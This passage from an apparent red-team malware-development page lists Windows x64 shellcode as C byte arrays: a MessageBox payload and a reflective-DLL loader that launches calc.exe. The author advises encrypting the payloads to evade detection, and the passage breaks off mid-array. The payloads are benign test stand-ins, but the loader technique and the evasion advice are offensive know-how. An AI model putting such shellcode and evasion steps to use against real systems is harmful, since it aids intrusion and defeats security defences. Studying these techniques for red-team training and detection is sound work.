<li>OS Build <strong>19045.4046</strong></li>
<li>MSVC vc.exe compiler (64-bit and 32-bit) version <strong>19.41.34123</strong></li>
</ul>
</li>
</ul>
<p>Shellcodes are not encrypted. You should encrypt them if you want evasion, as these shellcodes are public and not crafted manually by me.</p>
<h2 id="64-bit">64-bit</h2>
<h3 id="64-bit-messagebox">(64-bit) MessageBox</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x81</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x65</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0x4a</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x02</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0x52</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x48</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0xc0</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x44</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x3e</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x75</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xd6</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x41</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x3e</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x5e</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0x20</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x12</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0xc7</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0x1a</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x3e</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x8d</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0x35</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x83</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0xa6</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0x7c</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x6a</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x69</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x72</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x64</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x6d</span>, <span style="color:#ae81ff">0x20</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x54</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x4f</span>, <span style="color:#ae81ff">0x3a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x76</span>, <span style="color:#ae81ff">0x00</span>
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><h2 id="64-bit-calcexe-reflective-dll">(64-bit) calc.exe <strong>reflective DLL</strong></h2>
<p><strong>WARNING!</strong> Shellcode is too big. Careful when copying, as it sometime crashes my Visual Studio when pasting.</p>
<pre tabindex="0"><code>unsigned char payload_calc_reflective[] = { 0xe8, 0x0, 0x0, 0x0, 0x0, 0x59, 0x49, 0x89, 0xc8, 0x48, 0x81, 0xc1, 0x23, 0xb, 0x0, 0x0, 0xba, 0xc0, 0x11, 0x78, 0x3, 0x49, 0x81, 0xc0, 0x23, 0xa5, 0x1, 0x0, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x56, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x30, 0xc7, 0x44, 0x24, 0x20, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x5, 0x0, 0x0, 0x0, 0x48, 0x89, 0xf4, 0x5e, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x44, 0x89, 0x48, 0x20, 0x4c, 0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8d, 0x6c, 0x24, 0x90, 0x48, 0x81, 0xec, 0x70, 0x1, 0x0, 0x0, 0x45, 0x33, 0xff, 0xc7, 0x45, 0xd8, 0x6b, 0x0, 0x65, 0x0, 0x48, 0x8b, 0xf1, 0x4c, 0x89, 0x7d, 0xf8, 0xb9, 0x13, 0x9c, 0xbf, 0xbd, 0x4c, 0x89, 0x7d, 0xc8, 0x4c, 0x89, 0x7d, 0x8, 0x45, 0x8d, 0x4f, 0x65, 0x4c, 0x89, 0x7d, 0x10, 0x44, 0x88, 0x4d, 0xbc, 0x44, 0x88, 0x4d, 0xa2, 0x4c, 0x89, 0x7d, 0x0, 0x4c, 0x89, 0x7d, 0xf0, 0x4c, 0x89, 0x7d, 0x18, 0x44, 0x89, 0x7d, 0x24, 0x44, 0x89, 0x7c, 0x24, 0x2c, 0xc7, 0x45, 0xdc, 0x72, 0x0, 0x6e, 0x0, 0xc7, 0x45, 0xe0, 0x65, 0x0, 0x6c, 0x0, 0xc7, 0x45, 0xe4, 0x33, 0x0, 0x32, 0x0, 0xc7, 0x45, 0xe8, 0x2e, 0x0, 0x64, 0x0, 0xc7, 0x45, 0xec, 0x6c, 0x0, 0x6c, 0x0, 0xc7, 0x44, 0x24, 0x40, 0x53, 0x6c, 0x65, 0x65, 0xc6, 0x44, 0x24, 0x44, 0x70, 0xc7, 0x44, 0x24, 0x58, 0x4c, 0x6f, 0x61, 0x64, 0xc7, 0x44, 0x24, 0x5c, 0x4c, 0x69, 0x62, 0x72, 0xc7, 0x44, 0x24, 0x60, 0x61, 0x72, 0x79, 0x41, 0xc7, 0x44, 0x24, 0x48, 0x56, 0x69, 0x72, 0x74, 0xc7, 0x44, 0x24, 0x4c, 0x75, 0x61, 0x6c, 0x41, 0xc7, 0x44, 0x24, 0x50, 0x6c, 0x6c, 0x6f, 0x63, 0xc7, 0x44, 0x24, 0x68, 0x56, 0x69, 0x72, 0x74, 0xc7, 0x44, 0x24, 0x6c, 0x75, 0x61, 0x6c, 0x50, 0xc7, 0x44, 0x24, 0x70, 0x72, 0x6f, 0x74, 0x65, 0x66, 0xc7, 0x44, 0x24, 0x74, 0x63, 0x74, 0xc7, 0x45, 0xa8, 0x46, 0x6c, 0x75, 0x73, 0xc7, 0x45, 0xac, 0x68, 0x49, 0x6e, 0x73, 0xc7, 0x45, 0xb0, 0x74, 0x72, 0x75, 0x63, 0xc7, 0x45, 0xb4, 0x74, 0x69, 0x6f, 0x6e, 0xc7, 0x45, 0xb8, 0x43, 0x61, 0x63, 0x68, 0xc7, 0x44, 0x24, 0x78, 0x47, 0x65, 0x74, 0x4e, 0xc7, 0x44, 0x24, 0x7c, 0x61, 0x74, 0x69, 0x76, 0xc7, 0x45, 0x80, 0x65, 0x53, 0x79, 0x73, 0xc7, 0x45, 0x84, 0x74, 0x65, 0x6d, 0x49, 0x66, 0xc7, 0x45, 0x88, 0x6e, 0x66, 0xc6, 0x45, 0x8a, 0x6f, 0xc7, 0x45, 0x90, 0x52, 0x74, 0x6c, 0x41, 0xc7, 0x45, 0x94, 0x64, 0x64, 0x46, 0x75, 0xc7, 0x45, 0x98, 0x6e, 0x63, 0x74, 0x69, 0xc7, 0x45, 0x9c, 0x6f, 0x6e, 0x54, 0x61, 0x66, 0xc7, 0x45, 0xa0, 0x62, 0x6c, 0xe8, 0x7f, 0x8, 0x0, 0x0, 0xb9, 0xb5, 0x41, 0xd9, 0x5e, 0x48, 0x8b, 0xd8, 0xe8, 0x72, 0x8, 0x0, 0x0, 0x4c, 0x8b, 0xe8, 0x48, 0x89, 0x45, 0xd0, 0x48, 0x8d, 0x45, 0xd8, 0xc7, 0x45, 0x20, 0x18, 0x0, 0x18, 0x0, 0x4c, 0x8d, 0x4c, 0x24, 0x38, 0x48, 0x89, 0x45, 0x28, 0x4c, 0x8d, 0x45, 0x20, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0xd3, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x48, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0xc8, 0xc7, 0x44, 0x24, 0x28, 0xc, 0x0, 0xc, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x68, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0x0, 0xc7, 0x44, 0x24, 0x28, 0xe, 0x0, 0xe, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8d, 0x45, 0xa8, 0xc7, 0x44, 0x24, 0x28, 0x15, 0x0, 0x15, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x4c, 0x8d, 0x4d, 0x8, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x78, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0x10, 0xc7, 0x44, 0x24, 0x28, 0x13, 0x0, 0x13, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0xf0, 0xc7, 0x44, 0x24, 0x28, 0x5, 0x0, 0x5, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x45, 0x90, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0x18, 0xc7, 0x44, 0x24, 0x28, 0x13, 0x0, 0x13, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x48, 0x8b, 0x4c, 0x24, 0x38, 0x48, 0x8d, 0x44, 0x24, 0x58, 0x45, 0x33, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4d, 0xf8, 0xc7, 0x44, 0x24, 0x28, 0xc, 0x0, 0xc, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x28, 0x41, 0xff, 0xd5, 0x4c, 0x39, 0x7d, 0xc8, 0xf, 0x84, 0x1d, 0x7, 0x0, 0x0, 0x4c, 0x39, 0x7d, 0x0, 0xf, 0x84, 0x13, 0x7, 0x0, 0x0, 0x4c, 0x39, 0x7d, 0xf0, 0xf, 0x84, 0x9, 0x7, 0x0, 0x0, 0x4c, 0x39, 0x7d, 0x8, 0xf, 0x84, 0xff, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x55, 0x10, 0x48, 0x85, 0xd2, 0xf, 0x84, 0xf2, 0x6, 0x0, 0x0, 0x48, 0x63, 0x7e, 0x3c, 0x48, 0x3, 0xfe, 0x81, 0x3f, 0x50, 0x45, 0x0, 0x0, 0xf, 0x85, 0xdf, 0x6, 0x0, 0x0, 0xb8, 0x64, 0x86, 0x0, 0x0, 0x66, 0x39, 0x47, 0x4, 0xf, 0x85, 0xd0, 0x6, 0x0, 0x0, 0x45, 0x8d, 0x4f, 0x1, 0x44, 0x84, 0x4f, 0x38, 0xf, 0x85, 0xc2, 0x6, 0x0, 0x0, 0xf, 0xb7, 0x4f, 0x14, 0x41, 0x8b, 0xdf, 0x48, 0x83, 0xc1, 0x24, 0x66, 0x44, 0x3b, 0x7f, 0x6, 0x73, 0x25, 0x44, 0xf, 0xb7, 0x47, 0x6, 0x48, 0x3, 0xcf, 0x44, 0x39, 0x79, 0x4, 0x8b, 0x47, 0x38, 0xf, 0x45, 0x41, 0x4, 0x3, 0x1, 0x48, 0x8d, 0x49, 0x28, 0x3b, 0xc3, 0xf, 0x46, 0xc3, 0x8b, 0xd8, 0x4d, 0x2b, 0xc1, 0x75, 0xe3, 0x48, 0x8d, 0x4d, 0x38, 0xff, 0xd2, 0x8b, 0x55, 0x3c, 0x44, 0x8b, 0xc2, 0x44, 0x8d, 0x72, 0xff, 0xf7, 0xda, 0x44, 0x3, 0x77, 0x50, 0x49, 0x8d, 0x48, 0xff, 0x8b, 0xc2, 0x4c, 0x23, 0xf0, 0x8b, 0xc3, 0x48, 0x3, 0xc8, 0x49, 0x8d, 0x40, 0xff, 0x48, 0xf7, 0xd0, 0x48, 0x23, 0xc8, 0x4c, 0x3b, 0xf1, 0xf, 0x85, 0x54, 0x6, 0x0, 0x0, 0x48, 0x8b, 0x4f, 0x30, 0x41, 0xbc, 0x0, 0x30, 0x0, 0x0, 0x45, 0x8b, 0xc4, 0x41, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xd6, 0xff, 0x55, 0xc8, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x12, 0x44, 0x8d, 0x48, 0x4, 0x45, 0x8b, 0xc4, 0x49, 0x8b, 0xd6, 0x33, 0xc9, 0xff, 0x55, 0xc8, 0x48, 0x8b, 0xd8, 0x44, 0x8b, 0xa5, 0xd0, 0x0, 0x0, 0x0, 0x41, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x45, 0x84, 0xe3, 0x74, 0x1d, 0x8b, 0x46, 0x3c, 0x89, 0x43, 0x3c, 0x8b, 0x56, 0x3c, 0xeb, 0xb, 0x8b, 0xca, 0x41, 0x3, 0xd3, 0x8a, 0x4, 0x31, 0x88, 0x4, 0x19, 0x3b, 0x57, 0x54, 0x72, 0xf0, 0xeb, 0x19, 0x41, 0x8b, 0xd7, 0x44, 0x39, 0x7f, 0x54, 0x76, 0x10, 0x8b, 0xca, 0x41, 0x3, 0xd3, 0x8a, 0x4, 0x31, 0x88, 0x4, 0x19, 0x3b, 0x57, 0x54, 0x72, 0xf0, 0x48, 0x63, 0x7b, 0x3c, 0x45, 0x8b, 0xd7, 0x48, 0x3, 0xfb, 0x48, 0x89, 0x7d, 0x30, 0x44, 0xf, 0xb7, 0x47, 0x14, 0x49, 0x83, 0xc0, 0x28, 0x66, 0x44, 0x3b, 0x7f, 0x6, 0x73, 0x3a, 0x4c, 0x3, 0xc7, 0x45, 0x8b, 0xcf, 0x45, 0x39, 0x38, 0x76, 0x1f, 0x41, 0x8b, 0x50, 0x4, 0x41, 0x8b, 0x48, 0xfc, 0x41, 0x8b, 0xc1, 0x45, 0x3, 0xcb, 0x48, 0x3, 0xc8, 0x48, 0x3, 0xd0, 0x8a, 0x4, 0x32, 0x88, 0x4, 0x19, 0x45, 0x3b, 0x8, 0x72, 0xe1, 0xf, 0xb7, 0x47, 0x6, 0x45, 0x3, 0xd3, 0x49, 0x83, 0xc0, 0x28, 0x44, 0x3b, 0xd0, 0x72, 0xc9, 0x4c, 0x8b, 0xf3, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x4c, 0x2b, 0x77, 0x30, 0xf, 0x84, 0xd6, 0x0, 0x0, 0x0, 0x44, 0x39, 0xbf, 0xb4, 0x0, 0x0, 0x0, 0xf, 0x84, 0xc9, 0x0, 0x0, 0x0, 0x44, 0x8b, 0x8f, 0xb0, 0x0, 0x0, 0x0, 0x4c, 0x3, 0xcb, 0x45, 0x39, 0x39, 0xf, 0x84, 0xb6, 0x0, 0x0, 0x0, 0x4d, 0x8d, 0x51, 0x8, 0xe9, 0x91, 0x0, 0x0, 0x0, 0x45, 0xf, 0xb7, 0x1a, 0x41, 0xf, 0xb7, 0xcb, 0x41, 0xf, 0xb7, 0xc3, 0x66, 0xc1, 0xe9, 0xc, 0x66, 0x83, 0xf9, 0xa, 0x75, 0x29, 0x45, 0x8b, 0x1, 0x41, 0x81, 0xe3, 0xff, 0xf, 0x0, 0x0, 0x4b, 0x8d, 0x4, 0x18, 0x48, 0x8b, 0x14, 0x18, 0x4b, 0x8d, 0x4, 0x18, 0x41, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x49, 0x3, 0xd6, 0x48, 0x89, 0x14, 0x18, 0x45, 0x8d, 0x43, 0x1, 0xeb, 0x4f, 0x41, 0xbb, 0x1, 0x0, 0x0, 0x0, 0x66, 0x83, 0xf9, 0x3, 0x75, 0xe, 0x25, 0xff, 0xf, 0x0, 0x0, 0x48, 0x8d, 0xc, 0x3, 0x41, 0x8b, 0xc6, 0xeb, 0x2e, 0x66, 0x41, 0x3b, 0xcb, 0x75, 0x15, 0x25, 0xff, 0xf, 0x0, 0x0, 0x48, 0x8d, 0xc, 0x3, 0x49, 0x8b, 0xc6, 0x48, 0xc1, 0xe8, 0x10, 0xf, 0xb7, 0xc0, 0xeb, 0x13, 0x66, 0x41, 0x3b, 0xc8, 0x75, 0x14, 0x25, 0xff, 0xf, 0x0, 0x0, 0x48, 0x8d, 0xc, 0x3, 0x41, 0xf, 